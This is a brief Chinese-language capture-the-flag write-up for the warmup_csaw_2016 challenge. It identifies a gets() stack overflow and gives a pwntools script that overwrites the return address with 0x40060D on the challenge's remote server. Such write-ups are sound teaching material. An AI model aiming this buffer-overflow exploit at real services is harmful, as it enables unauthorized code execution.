[https://buuoj.cn/challenges#warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)

先ida

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1770956333807-0a915797-6f4e-4d09-9c1f-df195f8bd12f.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1770956384774-9c4eb338-382b-4fb2-b795-d9a08f8a76ea.png)

40060D的地址被打印出来

gets有明显栈溢出

我们让其直接返回40060D的地址即可

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1770956482780-d7fdfa63-c24b-4e3e-a81e-dd22e0ac8129.png)

啥也没开

```python
from pwn import *
p=remote('node5.buuoj.cn',26384)
flag=p64(0x40060d)
payload=b'a'*0x48+flag
p.sendline(payload)
p.interactive()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1770957175459-b12e2c5d-96fe-4b04-b138-ea12e612d48a.png)

